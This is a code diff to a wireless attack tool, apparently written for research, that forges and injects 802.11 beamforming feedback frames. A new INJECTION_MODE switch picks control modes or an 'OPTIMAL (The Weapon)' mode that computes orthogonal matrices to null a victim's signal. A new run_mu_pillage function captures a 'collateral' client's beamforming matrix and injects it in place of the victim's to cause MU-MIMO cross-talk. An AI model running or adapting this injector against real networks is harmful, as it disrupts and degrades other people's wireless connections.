@@ -20,6 +20,8 @@
 static const float PI = 3.14159265f;
 static const std::complex<float> J(0.0f, 1.0f);
 
+const int INJECTION_MODE = 0;
+
 //static const uint8_t RADIOTAP[] = {
 //    0x00, 0x00, 0x0c, 0x00,
 //    0x04, 0x80, 0x00, 0x00,
@@ -445,7 +447,7 @@ static bool do_inject(pcap_t* send, const std::vector<uint8_t>& buf) {
 Injector::Injector(const std::string& iface, bool debug)
     : iface_(iface), debug_(debug) {}
 
-void Injector::run_pillage(const APInfo& ap, const ClientInfo& victim) {
+void Injector::run_su_pillage(const APInfo& ap, const ClientInfo& victim) {
     (void)ap; 
     char errbuf[PCAP_ERRBUF_SIZE];
 
@@ -511,10 +513,122 @@ void Injector::run_pillage(const APInfo& ap, const ClientInfo& victim) {
         // 2. SLOW PATH: Update forged payload in the background
         // -------------------------------------------------------------------
         VMatList V = decompress(body + info.body_offset, info);
-        VMatList W = forge_orthogonal(V, info);
-        precomputed_forged_fb = compress(W, info);
+        //VMatList W = forge_orthogonal(V, info);
+        VMatList W;
+
+	// 2. Select the Forgery based on the INJECTION_MODE
+if (INJECTION_MODE == 0) {
+    // UNFORGED (Control 1)
+    // Re-inject the legitimate matrix. Proves CPU/Airtime overhead.
+    W = V; 
+} 
+else if (INJECTION_MODE == 1) {
+
+	// RANDOM (Control 2)
+    // Fill the matrices with random complex math to prove that specifically 
+    // calculated orthogonal math is required to create a null.
+    W = V; // Copy the structure and subcarrier count from V
+    
+    // Iterate through every subcarrier matrix
+    for (size_t i = 0; i < W.size(); ++i) {
+        // Eigen's built-in function replaces all elements in the 
+        // matrix with random complex floats.
+        W[i].setRandom(); 
+    }
+
+} 
+else if (INJECTION_MODE == 2) {
+    // OPTIMAL (The Weapon)
+    // Calculate the orthogonal matrix W where W is perpendicular to V.
+    W = forge_orthogonal(V, info);
+}
+
+	precomputed_forged_fb = compress(W, info);
         precomputed_info = info;
         has_precomputed = true;
+    }
+    pcap_close(sniff); pcap_close(send);
+}
+
+void Injector::run_mu_pillage(const APInfo& ap, const ClientInfo& victim, const ClientInfo& collateral) {
+    (void)ap; 
+    char errbuf[PCAP_ERRBUF_SIZE];
+
+    pcap_t* sniff = pcap_open_live(iface_.c_str(), 65535, 1, 10, errbuf);
+    if (!sniff) { fprintf(stderr,"[!] sniff: %s\n",errbuf); return; }
+    pcap_t* send  = pcap_open_live(iface_.c_str(), 65535, 1, 0,  errbuf);
+    if (!send)  { fprintf(stderr,"[!] send: %s\n", errbuf); pcap_close(sniff); return; }
+
+    char filter[512];
+    snprintf(filter, sizeof(filter),
+             "(wlan[0] == 0xd0 or wlan[0] == 0xe0) and (wlan addr2 %s or wlan addr2 %s)",
+             victim.mac.c_str(), collateral.mac.c_str());
+    struct bpf_program fp;
+    if (pcap_compile(sniff, &fp, filter, 0, PCAP_NETMASK_UNKNOWN) == 0) pcap_setfilter(sniff, &fp);
+
+    printf("[*] MU-MIMO Pillage (Cross-Talk)\n[*] Waiting for Collateral BFI...\n\n");
+
+    struct pcap_pkthdr* hdr;
+    const uint8_t* pkt;
+
+    VMatList col_V;
+    bool col_ready = false, has_precomputed = false;
+    std::vector<uint8_t> precomputed_forged_fb;
+    BFIInfo precomputed_info;
+    int total = 0;
+
+    while (true) {
+        if (pcap_next_ex(sniff, &hdr, &pkt) != 1) continue;
+        uint16_t rt_len = pkt[2] | (pkt[3] << 8);
+        if ((int)hdr->caplen < rt_len + 28) continue;
+
+        const uint8_t* mac_hdr = pkt + rt_len;
+        if (mac_hdr[1] & 0x08) continue; // Ignore retries
+
+        std::string ta_str = mac_str(mac_hdr + 10);
+        const uint8_t* body = mac_hdr + 24;
+        int body_len = (int)hdr->caplen - rt_len - 24 - 4;
+
+        BFIInfo info = detect_bfi(body, body_len);
+        if (!info.valid || info.feedback_len == 0) continue;
+
+        // Capture the Collateral target's matrix
+        if (ta_str == collateral.mac) {
+            col_V = decompress(body + info.body_offset, info);
+            col_ready = true;
+            has_precomputed = false; // Invalidate cache so we re-align
+            printf("\n[+] Collateral Matrix Captured (Nr=%d Nc=%d)\n", info.Nr, info.Nc);
+            continue;
+        }
+
+        // Overwrite the Primary Victim's matrix with the Collateral's matrix
+        if (ta_str == victim.mac && col_ready) {
+            
+            // FAST PATH: Instant Overwrite
+            if (has_precomputed && info.Nst == precomputed_info.Nst) {
+                std::vector<uint8_t> burst_buf = build_forged_buf(pkt, (int)hdr->caplen, precomputed_forged_fb, info.body_offset);
+                do_inject(send, burst_buf);
+                do_inject(send, burst_buf);
+                
+                uint16_t seq = ((mac_hdr[22] | (mac_hdr[23] << 8)) >> 4) & 0xFFF;
+                total += 2;
+                printf("\r[MU-PILLAGE] Cross-Talk Injected! (SN:%04d) Total:%-6d  ", seq, total);
+                fflush(stdout);
+            }
+
+            // SLOW PATH: Set Victim's Matrix W perfectly equal to Collateral's Matrix V
+            // We use Eigen block copying to prevent crashes if the clients have different antenna (Nc/Nr) counts!
+            VMatList W(info.Nst, CMat::Zero(info.Nr, info.Nc));
+            for (int kk = 0; kk < info.Nst; kk++) {
+                int min_r = std::min((int)info.Nr, (int)col_V[kk].rows());
+                int min_c = std::min((int)info.Nc, (int)col_V[kk].cols());
+                W[kk].block(0,0, min_r, min_c) = col_V[kk].block(0,0, min_r, min_c);
+            }
+
+            precomputed_forged_fb = compress(W, info);
+            precomputed_info = info;
+            has_precomputed = true;
+        }
     }
     pcap_close(sniff); pcap_close(send);
 }
